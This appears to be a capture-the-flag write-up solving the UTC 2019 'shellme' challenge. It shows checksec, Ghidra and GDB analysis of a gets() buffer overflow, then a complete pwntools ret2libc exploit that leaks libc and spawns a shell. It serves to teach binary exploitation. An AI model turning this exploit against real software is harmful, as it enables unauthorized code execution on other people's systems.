---
search:
  exclude: true
---
# Utc 2019 shellme

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → wget -q https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/utc19_shellme/libc6_2.27-3ubuntu1_i386.so
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → wget -q https://github.com/guyinatuxedo/nightmare/raw/master/modules/08-bof_dynamic/utc19_shellme/server
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → file server
    server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=be2f490cdd60374344e1075c9dd31060666bd524, not stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → chmod +x server
    
    

` ![]()

## Solution 

First let's run pwn checksec on the binary file, and then execute it to see what it does:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → pwn checksec server; ./server
    [*] '/home/nothing/binexp/2/shme/server'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffd2a2e0 | 00 00 00 00 00 00 00 00 |
    0xffd2a2e8 | 00 00 00 00 00 00 00 00 |
    0xffd2a2f0 | 00 00 00 00 00 00 00 00 |
    0xffd2a2f8 | 00 00 00 00 00 00 00 00 |
    0xffd2a300 | ff ff ff ff ff ff ff ff |
    0xffd2a308 | ff ff ff ff ff ff ff ff |
    0xffd2a310 | 40 d5 f0 f7 00 a0 04 08 |
    0xffd2a318 | 28 a3 d2 ff 8b 86 04 08 |
    Return address: 0x0804868b
    
    Input some text: here is some text
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffd2a2e0 | 68 65 72 65 20 69 73 20 |
    0xffd2a2e8 | 73 6f 6d 65 20 74 65 78 |
    0xffd2a2f0 | 74 00 00 00 00 00 00 00 |
    0xffd2a2f8 | 00 00 00 00 00 00 00 00 |
    0xffd2a300 | ff ff ff ff ff ff ff ff |
    0xffd2a308 | ff ff ff ff ff ff ff ff |
    0xffd2a310 | 40 d5 f0 f7 00 a0 04 08 |
    0xffd2a318 | 28 a3 d2 ff 8b 86 04 08 |
    Return address: 0x0804868b
    
    

We see that we are dealing with a 32bit binary that has NX enabled, when we run the binary, and put in too much text we get the following:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → ./server
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffd19e90 | 00 00 00 00 00 00 00 00 |
    0xffd19e98 | 00 00 00 00 00 00 00 00 |
    0xffd19ea0 | 00 00 00 00 00 00 00 00 |
    0xffd19ea8 | 00 00 00 00 00 00 00 00 |
    0xffd19eb0 | ff ff ff ff ff ff ff ff |
    0xffd19eb8 | ff ff ff ff ff ff ff ff |
    0xffd19ec0 | 40 75 ef f7 00 a0 04 08 |
    0xffd19ec8 | d8 9e d1 ff 8b 86 04 08 |
    Return address: 0x0804868b
    
    Input some text: 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffd19e90 | 30 30 30 30 30 30 30 30 |
    0xffd19e98 | 30 30 30 30 30 30 30 30 |
    0xffd19ea0 | 30 30 30 30 30 30 30 30 |
    0xffd19ea8 | 30 30 30 30 30 30 30 30 |
    0xffd19eb0 | 30 30 30 30 30 30 30 30 |
    0xffd19eb8 | 30 30 30 30 30 30 30 30 |
    0xffd19ec0 | 30 30 30 30 30 30 30 30 |
    0xffd19ec8 | 30 30 30 30 30 30 30 30 |
    Return address: 0x30303030
    
    [1]    1782143 segmentation fault (core dumped)  ./server
    
    
    

So here we see that we can cause a seg fault when we put in too much text, now let's take a look at it from inside ghidra:

![](51.png)

Luckily this time the main function is actually called 'main' so it was easy to find, we get the following code:
    
    
    undefined4 main(void)
    
    {
      undefined *puVar1;
      
      puVar1 = &stack0x00000004;
      setbuf(stdout,(char *)0x0);
      setbuf(stdin,(char *)0x0);
      vuln(puVar1);
      return 0;
    }
    
    

Here we see a function called 'vuln' so let's take a look at it: 
    
    
    void vuln(void)
    
    {
      char local_3c [32];
      undefined local_1c [20];
      
      memset(local_3c,0,0x20);
      memset(local_1c,0xff,0x10);
      init_visualize(local_3c);
      visualize(local_3c);
      printf("Input some text: ");
      gets(local_3c);
      visualize(local_3c);
      return;
    }
    

Here we see that local_3c is initially set to be able to hold only 32 bytes of data, but then we see that it gets passed into a gets() call, and we know that gets calls are vulnerable to buffer overflows because it doesn't restrict our input at all. Plus since there is no stack canary, we can overwrite the return address and get code execution, so we let's set a breakpoint after the gets call, and see where our text input is stored in memory:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/25 ] [binexp/2/shme]
    → gdb ./server
    GNU gdb (GDB) 10.1
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-pc-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1 using Python engine 3.9
    Reading symbols from ./server...
    (No debugging symbols found in ./server)
    gef➤  disas vulnm
    No symbol table is loaded.  Use the "file" command.
    gef➤  disas vuln
    Dump of assembler code for function vuln:
       0x080485b1 <+0>:     push   ebp
       0x080485b2 <+1>:     mov    ebp,esp
       0x080485b4 <+3>:     push   ebx
       0x080485b5 <+4>:     sub    esp,0x34
       0x080485b8 <+7>:     call   0x80484c0 <__x86.get_pc_thunk.bx>
       0x080485bd <+12>:    add    ebx,0x1a43
       0x080485c3 <+18>:    sub    esp,0x4
       0x080485c6 <+21>:    push   0x20
       0x080485c8 <+23>:    push   0x0
       0x080485ca <+25>:    lea    eax,[ebp-0x38]
       0x080485cd <+28>:    push   eax
       0x080485ce <+29>:    call   0x8048440 
       0x080485d3 <+34>:    add    esp,0x10
       0x080485d6 <+37>:    sub    esp,0x4
       0x080485d9 <+40>:    push   0x10
       0x080485db <+42>:    push   0xff
       0x080485e0 <+47>:    lea    eax,[ebp-0x18]
       0x080485e3 <+50>:    push   eax
       0x080485e4 <+51>:    call   0x8048440 
       0x080485e9 <+56>:    add    esp,0x10
       0x080485ec <+59>:    sub    esp,0xc
       0x080485ef <+62>:    lea    eax,[ebp-0x38]
       0x080485f2 <+65>:    push   eax
       0x080485f3 <+66>:    call   0x804869e 
       0x080485f8 <+71>:    add    esp,0x10
       0x080485fb <+74>:    sub    esp,0xc
       0x080485fe <+77>:    lea    eax,[ebp-0x38]
       0x08048601 <+80>:    push   eax
       0x08048602 <+81>:    call   0x80486e1 
       0x08048607 <+86>:    add    esp,0x10
       0x0804860a <+89>:    sub    esp,0xc
       0x0804860d <+92>:    lea    eax,[ebx-0x16dd]
       0x08048613 <+98>:    push   eax
       0x08048614 <+99>:    call   0x80483f0 
       0x08048619 <+104>:   add    esp,0x10
       0x0804861c <+107>:   sub    esp,0xc
       0x0804861f <+110>:   lea    eax,[ebp-0x38]
       0x08048622 <+113>:   push   eax
       0x08048623 <+114>:   call   0x8048400 
       0x08048628 <+119>:   add    esp,0x10
       0x0804862b <+122>:   sub    esp,0xc
       0x0804862e <+125>:   lea    eax,[ebp-0x38]
       0x08048631 <+128>:   push   eax
       0x08048632 <+129>:   call   0x80486e1 
       0x08048637 <+134>:   add    esp,0x10
       0x0804863a <+137>:   nop
       0x0804863b <+138>:   mov    ebx,DWORD PTR [ebp-0x4]
       0x0804863e <+141>:   leave
       0x0804863f <+142>:   ret
    End of assembler dump.
    gef➤  b *vuln+119
    Breakpoint 1 at 0x8048628
    gef➤  r
    Starting program: /home/nothing/binexp/2/shme/server
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffffd0a0 | 00 00 00 00 00 00 00 00 |
    0xffffd0a8 | 00 00 00 00 00 00 00 00 |
    0xffffd0b0 | 00 00 00 00 00 00 00 00 |
    0xffffd0b8 | 00 00 00 00 00 00 00 00 |
    0xffffd0c0 | ff ff ff ff ff ff ff ff |
    0xffffd0c8 | ff ff ff ff ff ff ff ff |
    0xffffd0d0 | 40 05 f9 f7 00 a0 04 08 |
    0xffffd0d8 | e8 d0 ff ff 8b 86 04 08 |
    Return address: 0x0804868b
    
    Input some text: 13371337
    
    Breakpoint 1, 0x08048628 in vuln ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $eax   : 0xffffd0a0  →  "13371337"
    $ebx   : 0x0804a000  →  0x08049f0c  →  0x00000001
    $ecx   : 0xf7f90540  →  0xfbad208b
    $edx   : 0xfbad208b
    $esp   : 0xffffd090  →  0xffffd0a0  →  "13371337"
    $ebp   : 0xffffd0d8  →  0xffffd0e8  →  0x00000000
    $esi   : 0x1
    $edi   : 0x08048470  →  <_start+0> xor ebp, ebp
    $eip   : 0x08048628  →   add esp, 0x10
    $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffd090│+0x0000: 0xffffd0a0  →  "13371337"    ← $esp
    0xffffd094│+0x0004: 0x000000ff
    0xffffd098│+0x0008: 0x00000010
    0xffffd09c│+0x000c: 0x080485bd  →   add ebx, 0x1a43
    0xffffd0a0│+0x0010: "13371337"
    0xffffd0a4│+0x0014: "1337"
    0xffffd0a8│+0x0018: 0x00000000
    0xffffd0ac│+0x001c: 0x00000000
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
        0x804861f        lea    eax, [ebp-0x38]
        0x8048622        push   eax
        0x8048623        call   0x8048400 
     →  0x8048628        add    esp, 0x10
        0x804862b        sub    esp, 0xc
        0x804862e        lea    eax, [ebp-0x38]
        0x8048631        push   eax
        0x8048632        call   0x80486e1 
        0x8048637        add    esp, 0x10
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "server", stopped 0x8048628 in vuln (), reason: BREAKPOINT
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x8048628 → vuln()
    [#1] 0x804868b → main()
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤
    
    

So what we did here was first disassemble the vuln function, set the breakpoint to be right after the gets call, and then run the binary, we gave it a simple pattern (13371337) and then we hit our breakpoint. So let's search for our pattern in memory, to determine the offset in between our input and the return address:
    
    
    gef➤  search-pattern 13371337
    [+] Searching '13371337' in memory
    [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
      0xffffd0a0 - 0xffffd0a8  →   "13371337"
    
    gef➤  info frame
    Stack level 0, frame at 0xffffd0e0:
     eip = 0x8048628 in vuln; saved eip = 0x804868b
     called by frame at 0xffffd100
     Arglist at 0xffffd0d8, args:
     Locals at 0xffffd0d8, Previous frame's sp is 0xffffd0e0
     Saved registers:
      ebx at 0xffffd0d4, ebp at 0xffffd0d8, eip at 0xffffd0dc
    
    

Here we see that our input text is at **0xffffd0a0** and the return address is at **0xffffd0dc** So we can easily find the offset from a python3 shell:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/17 ] [Nextcloud/blog]
    → python3
    Python 3.9.2 (default, Feb 20 2021, 18:40:11)
    [GCC 10.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> hex(  0xffffd0a0  -  0xffffd0dc  )
    '-0x3c'
    
    

And here we see that we have a 0x3c bytes offset between our text input and the return address. The idea here is that we're going to call an instruction pointer, but what is it that we're going to call ? All we need is just 2 libc infoleaks, and it can become possible to identify the libc versions. 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/27 ] [binexp/2/shme]
    → objdump -D server | grep puts
    08048410 <****puts@plt>:
     8048704:       e8 07 fd ff ff          call   8048410 <****puts@plt>
     8048716:       e8 f5 fc ff ff          call   8048410 <****puts@plt>
     8048846:       e8 c5 fb ff ff          call   8048410 <****puts@plt>
     8048881:       e8 8a fb ff ff          call   8048410 <****puts@plt>

` ****
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/27 ] [binexp/2/shme]
    → vim exploit.py
    
    

We're going to make use of guyinatuxedo's ['TheNight']() Python library:
    
    
    import TheNight
    from pwn import *
    
    
    libc = ELF("libc6_2.27-3ubuntu1_i386.so")
    target = process("./server")
    elf = ELF('server')
    
    
    payload = ""
    payload += "0"*0x3c
    payload += p32(elf.symbols["puts"])
    payload += p32(elf.symbols["vuln"])
    payload += p32(elf.got["puts"])
    
    target.sendline(payload)
    
    
    for i in range(0, 2):
        print target.recvuntil("Return address:")
    
    
    for i in range(0, 2):
        print target.recvline()
    
    
    leak0 = target.recvline()[0:4]
    
    puts = u32(leak0)
    
    libcBase = puts - libc.symbols["puts"]
    
    print "libc base: " + hex(libcBase)
    
    binshOffset = 0x17e0cf
    
    payload1 = ""
    payload1 += "0"*0x3c
    payload1 += p32(libcBase + libc.symbols["system"])
    payload1 += p32(0x30303030)
    payload1 += p32(libcBase + binshOffset)
    
    target.sendline(payload1)
    
    target.interactive()
    

And when we run it:
    
    
    [*] '/Hackery/utc/shelltime/libc6_2.27-3ubuntu1_i386.so'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] '/Hackery/utc/shelltime/server'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffbba510 | 00 00 00 00 00 00 00 00 |
    0xffbba518 | 00 00 00 00 00 00 00 00 |
    0xffbba520 | 00 00 00 00 00 00 00 00 |
    0xffbba528 | 00 00 00 00 00 00 00 00 |
    0xffbba530 | ff ff ff ff ff ff ff ff |
    0xffbba538 | ff ff ff ff ff ff ff ff |
    0xffbba540 | c0 d5 ef f7 00 a0 04 08 |
    0xffbba548 | 58 a5 bb ff 8b 86 04 08 |
    Return address:
     0x0804868b
    
    Input some text:
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffbba510 | 30 30 30 30 30 30 30 30 |
    0xffbba518 | 30 30 30 30 30 30 30 30 |
    0xffbba520 | 30 30 30 30 30 30 30 30 |
    0xffbba528 | 30 30 30 30 30 30 30 30 |
    0xffbba530 | 30 30 30 30 30 30 30 30 |
    0xffbba538 | 30 30 30 30 30 30 30 30 |
    0xffbba540 | 30 30 30 30 30 30 30 30 |
    0xffbba548 | 30 30 30 30 10 84 04 08 |
    Return address:
     0x08048410
    
    
    
    libc base: 0xf7d25000
    [*] Switching to interactive mode
    
    Legend: buff \x1b[32;1mMODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffbba518 | 00 00 00 00 00 00 00 00 |
    0xffbba520 | 00 00 00 00 00 00 00 00 |
    0xffbba528 | 00 00 00 00 00 00 00 00 |
    0xffbba530 | 00 00 00 00 00 00 00 00 |
    0xffbba538 | ff ff ff ff ff ff ff ff |
    0xffbba540 | ff ff ff ff ff ff ff ff |
    0xffbba548 | 00 00 00 00 30 30 30 30 |
    0xffbba550 | 30 30 30 30 18 a0 04 08 |
    Return address: 0x0804a018
    
    Input some text:
    Legend: buff MODIFIED padding MODIFIED
      notsecret MODIFIED secret MODIFIED
      return address MODIFIED
    0xffbba518 | 30 30 30 30 30 30 30 30 |
    0xffbba520 | 30 30 30 30 30 30 30 30 |
    0xffbba528 | 30 30 30 30 30 30 30 30 |
    0xffbba530 | 30 30 30 30 30 30 30 30 |
    0xffbba538 | 30 30 30 30 30 30 30 30 |
    0xffbba540 | 30 30 30 30 30 30 30 30 |
    0xffbba548 | 30 30 30 30 30 30 30 30 |
    0xffbba550 | 30 30 30 30 00 22 d6 f7 |
    Return address: 0xf7d62200
    
    $ cat flag.txt
    utc{c0ntr0ling_r1p_1s_n0t_t00_h4rd}
    
    

And we get the flag!

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

